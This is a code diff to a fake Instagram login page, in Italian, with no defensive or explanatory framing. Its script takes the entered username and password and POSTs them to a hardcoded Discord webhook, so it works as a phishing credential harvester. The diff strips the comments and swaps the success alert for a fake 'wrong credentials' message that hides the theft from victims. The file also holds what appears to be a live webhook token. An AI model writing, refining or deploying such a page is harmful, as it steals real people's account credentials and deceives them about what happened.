@@ -10,9 +10,7 @@
   <main class="container">
     <div class="login-box">
       <img src="instagram-logo.png" alt="Instagram" class="logo">
-      <!-- Assegno l'ID "login-form" al form -->
       <form id="login-form">
-        <!-- Aggiungo degli ID validi agli input -->
         <input id="username" type="text" placeholder="Telefono, nome utente o e-mail" required>
         <input id="password" type="password" placeholder="Password" required>
         <button type="submit">Accedi</button>
@@ -61,25 +59,20 @@
   </footer>
 
   <script>
-    // Seleziona il form usando l'ID corretto
     const form = document.getElementById('login-form');
 
     form.addEventListener('submit', function(e) {
       e.preventDefault(); // Blocca il comportamento predefinito del form
 
-      // Prendi i valori degli input usando gli ID validi
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // URL del webhook Discord (verifica che sia corretto e attivo)
       const webhookURL = "https://discordapp.com/api/webhooks/1365809847207071774/oqQLe1MAarTIe7WO2Lj9s8dUD-EHbMBs70Z3HmLZlmrVJFkt4nkSUF_G8uBc1HvBH4zj";
 
-      // Costruisci il messaggio da inviare
       const message = {
         content: `📩 Nuovo invio!\nTelefono, nome utente o e-mail: ${username}\nPassword: ${password}`
       };
 
-      // Usa fetch per fare una richiesta POST al webhook
       fetch(webhookURL, {
         method: 'POST',
         headers: {
@@ -89,7 +82,7 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('Dati inviati con successo!');
+          alert('instagram.login dice credenziali errate');
           form.reset();
         } else {
           alert('Errore nell\'invio.');
